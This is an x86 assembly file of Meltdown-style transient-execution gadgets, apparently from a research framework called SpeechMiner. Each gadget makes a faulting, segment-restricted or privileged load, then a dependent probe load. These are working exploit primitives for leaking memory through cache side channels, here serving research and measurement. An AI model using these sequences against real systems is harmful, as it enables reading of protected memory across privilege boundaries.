# Code sequences to be selected by SpeechMiner (32-bit)

# ---------------------------------------------------------------------------
# Standard code sequence
	.text
	.global meltdown_depth_begin
	.global meltdown_depth_end
	.type meltdown_depth_begin, @function
meltdown_depth_begin:
	sub %ebx, %ecx
	sub $64, %ebx
	movl (%ebx), %edi
	movl (%edi, %ecx, 1), %ecx
	movl (%edi, %ecx, 1), %ecx
	add $1, %ecx
	sub $1, %ecx
	add $1, %ecx
	sub $1, %ecx
	add $1, %ecx
	sub $1, %ecx
	add $1, %ecx
	sub $1, %ecx
	add $1, %ecx
	sub $1, %ecx
meltdown_depth_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_bound_begin
	.global meltdown_bound_end
	.type meltdown_bound_begin, @function
meltdown_bound_begin:
	movl %ebx, %eax
	add $0x3c0, %ebx
	bound %ecx, (%ebx)
	movl (%ecx), %edx
	movl (%eax,%edx,1), %eax
meltdown_bound_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_segment_ds_begin
	.global meltdown_segment_ds_end
	.type meltdown_segment_ds_begin, @function
meltdown_segment_ds_begin:
	movl $0x7, %eax
	movl %eax, %ds
	mfence
	mov %ebx, %edi
	sub $64, %edi
	movl %ss:(%edi), %edi
	movl (%ecx), %edx
	movl %ss:(%ebx,%edx,1), %edx
meltdown_segment_ds_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_segment_ss_begin
	.global meltdown_segment_ss_end
	.type meltdown_segment_ss_begin, @function
meltdown_segment_ss_begin:
	movl $0x7, %eax
	movl %eax, %ss
	mfence
	mov %ebx, %edi
	sub $64, %edi
	movl (%edi), %edi
	movl %ss:(%ecx), %edx
	movl (%ebx,%edx,1), %edx
meltdown_segment_ss_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_segment_ss_np_begin
	.global meltdown_segment_ss_np_end
	.type meltdown_segment_ss_np_begin, @function
meltdown_segment_ss_np_begin:
	movl $0x7, %eax
	movl %eax, %ss
	mov %ebx, %edi
	sub $64, %edi
	movl (%edi), %edi
	movl %ss:(%ecx), %edx
	movl (%ebx,%edx,1), %edx
meltdown_segment_ss_np_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_segment_cs_begin
	.global meltdown_segment_cs_end
	.type meltdown_segment_cs_begin, @function
meltdown_segment_cs_begin:
	mov %ebx, %edi
	sub $64, %edi
	movl (%edi), %edi
	movl %cs:(%ecx), %edx
	movl (%ebx,%edx,1), %edx
meltdown_segment_cs_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_segment_ds_null_begin
	.global meltdown_segment_ds_null_end
	.type meltdown_segment_ds_null_begin, @function
meltdown_segment_ds_null_begin:
	movl $0x0, %eax
	movl %eax, %ds
	mfence
	mov %ebx, %edi
	sub $64, %edi
	movl %ss:(%edi), %edi
	movl (%ecx), %edx
	movl %ss:(%ebx,%edx,1), %edx
meltdown_segment_ds_null_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_segment_ss_null_begin
	.global meltdown_segment_ss_null_end
	.type meltdown_segment_ss_null_begin, @function
meltdown_segment_ss_null_begin:
	movl $0x0, %eax
	movl %eax, %ss
	mov %ebx, %edi
	sub $64, %edi
	movl (%edi), %edi
	movl %ss:(%ecx), %edx
	movl (%ebx,%edx,1), %edx
meltdown_segment_ss_null_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_segment_ds_privilege_begin
	.global meltdown_segment_ds_privilege_end
	.type meltdown_segment_ds_privilege_begin, @function
meltdown_segment_ds_privilege_begin:
	movl $0x18, %eax
	movl %eax, %ds
	mov %ebx, %edi
	sub $64, %edi
	movl %ss:(%edi), %edi
	movl (%ecx), %edx
	movl %ss:(%ebx,%edx,1), %edx
meltdown_segment_ds_privilege_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_segment_ss_privilege_begin
	.global meltdown_segment_ss_privilege_end
	.type meltdown_segment_ss_privilege_begin, @function
meltdown_segment_ss_privilege_begin:
	movl $0x18, %eax
	movl %eax, %ss
	mov %ebx, %edi
	sub $64, %edi
	movl (%edi), %edi
	movl %ss:(%ecx), %edx
	movl (%ebx,%edx,1), %edx
meltdown_segment_ss_privilege_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_segment_ds_write_begin
	.global meltdown_segment_ds_write_end
	.type meltdown_segment_ds_write_begin, @function
meltdown_segment_ds_write_begin:
	movl $0x7, %eax
	movl %eax, %ds
	mfence             
	mov %ebx, %edi
	sub $64, %edi
	movl %ss:(%edi), %edi
	movl $0x42000, (%ecx)
	movl (%ecx), %edx
	movl %ss:(%ebx,%edx,1), %edx
meltdown_segment_ds_write_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_segment_cs_write_begin
	.global meltdown_segment_cs_write_end
	.type meltdown_segment_cs_write_begin, @function
meltdown_segment_cs_write_begin:
	movl $0x7, %eax
	movl %eax, %ds
	mfence             
	mov %ebx, %edi
	sub $64, %edi
	movl (%edi), %edi
	movl $0x42000, %cs:(%ecx)
	movl (%ecx), %edx
	movl (%ebx,%edx,1), %edx
meltdown_segment_cs_write_end:
	nop



# ---------------------------------------------------------------------------
	.global branch_meltdown_standard_begin
	.global branch_meltdown_standard_end
	.type branch_meltdown_standard_begin, @function
branch_meltdown_standard_begin:
	movl $0x1, %eax
	movl $0x2b, %edx
	movl %edx, %ds
	mfence        
	movl %es:(%eax), %eax
	movl (%ecx), %ecx
	movl %es:(%ebx,%ecx,1), %ecx
branch_meltdown_standard_end:
	add $1, %ecx
	sub $1, %ecx
	nop

# ---------------------------------------------------------------------------
	.global branch_meltdown_segment_ds_begin
	.global branch_meltdown_segment_ds_end
	.type branch_meltdown_segment_ds_begin, @function
branch_meltdown_segment_ds_begin:
	movl $0x1, %eax
	movl $0x7, %edx
	movl %edx, %ds
	mfence        
	movl %es:(%eax), %eax
	movl (%ecx), %ecx
	movl %es:(%ebx,%ecx,1), %ecx
	add $1, %ecx
	sub $1, %ecx
branch_meltdown_segment_ds_end:
	nop

# ---------------------------------------------------------------------------
	.global branch_meltdown_segment_ss_begin
	.global branch_meltdown_segment_ss_end
	.type branch_meltdown_segment_ss_begin, @function
branch_meltdown_segment_ss_begin:
	movl $0x1, %eax
	movl $0x7, %edx
	movl %edx, %ss
	mfence          
	movl %es:(%eax), %eax
	movl %ss:(%ecx), %ecx
	movl %es:(%ebx,%ecx,1), %ecx
branch_meltdown_segment_ss_end:
	nop

# ---------------------------------------------------------------------------
	.global branch_meltdown_segment_ss_np_begin
	.global branch_meltdown_segment_ss_np_end
	.type branch_meltdown_segment_ss_np_begin, @function
branch_meltdown_segment_ss_np_begin:
	movl $0x1, %eax
	movl $0x7, %edx
	movl %es:(%eax), %eax
	movl %edx, %ss
	movl %ss:(%ecx), %ecx
	movl %es:(%ebx,%ecx,1), %ecx
branch_meltdown_segment_ss_np_end:
	nop

# ---------------------------------------------------------------------------
	.global branch_meltdown_segment_cs_begin
	.global branch_meltdown_segment_cs_end
	.type branch_meltdown_segment_cs_begin, @function
branch_meltdown_segment_cs_begin:
	movl $0x1, %eax
	movl $0x2b, %edx
	movl %edx, %ds
	mfence          
	movl %es:(%eax), %eax
	movl %cs:(%ecx), %ecx
	movl %es:(%ebx,%ecx,1), %ecx
branch_meltdown_segment_cs_end:
	nop
	
# ---------------------------------------------------------------------------
	.global branch_meltdown_segment_ds_null_begin
	.global branch_meltdown_segment_ds_null_end
	.type branch_meltdown_segment_ds_null_begin, @function
branch_meltdown_segment_ds_null_begin:
	movl $0x1, %eax
	movl $0x0, %edx
	movl %edx, %ds
	mfence        
	movl %es:(%eax), %eax
	movl (%ecx), %ecx
	movl %es:(%ebx,%ecx,1), %ecx
branch_meltdown_segment_ds_null_end:
	nop
	
# ---------------------------------------------------------------------------
	.global branch_meltdown_segment_ss_null_begin
	.global branch_meltdown_segment_ss_null_end
	.type branch_meltdown_segment_ss_null_begin, @function
branch_meltdown_segment_ss_null_begin:
	movl $0x1, %eax
	movl $0x0, %edx
	movl %es:(%eax), %eax
	movl %edx, %ss
	movl %ss:(%ecx), %ecx
	movl %es:(%ebx,%ecx,1), %ecx
branch_meltdown_segment_ss_null_end:
	nop
	
# ---------------------------------------------------------------------------
	.global branch_meltdown_segment_ds_privilege_begin
	.global branch_meltdown_segment_ds_privilege_end
	.type branch_meltdown_segment_ds_privilege_begin, @function
branch_meltdown_segment_ds_privilege_begin:
	movl $0x1, %eax
	movl $0x18, %edx
	movl %es:(%eax), %eax
	movl %edx, %ds
	movl %ds:(%ecx), %ecx
	movl %es:(%ebx,%ecx,1), %ecx
branch_meltdown_segment_ds_privilege_end:
	nop
	
# ---------------------------------------------------------------------------
	.global branch_meltdown_segment_ss_privilege_begin
	.global branch_meltdown_segment_ss_privilege_end
	.type branch_meltdown_segment_ss_privilege_begin, @function
branch_meltdown_segment_ss_privilege_begin:
	movl $0x1, %eax
	movl $0x18, %edx
	movl %es:(%eax), %eax
	movl %edx, %ss
	movl %ss:(%ecx), %ecx
	movl %es:(%ebx,%ecx,1), %ecx
branch_meltdown_segment_ss_privilege_end:
	nop
	
# ---------------------------------------------------------------------------
	.global branch_meltdown_segment_ds_write_begin
	.global branch_meltdown_segment_ds_write_end
	.type branch_meltdown_segment_ds_write_begin, @function
branch_meltdown_segment_ds_write_begin:
	movl $0x1, %eax
	movl $0x7, %edx
	movl %edx, %ds
	mfence          
	movl %es:(%eax), %eax
	movl $0x42000, (%ecx)
	movl (%ecx), %ecx
	movl %es:(%ebx,%ecx,1), %ecx
branch_meltdown_segment_ds_write_end:
	nop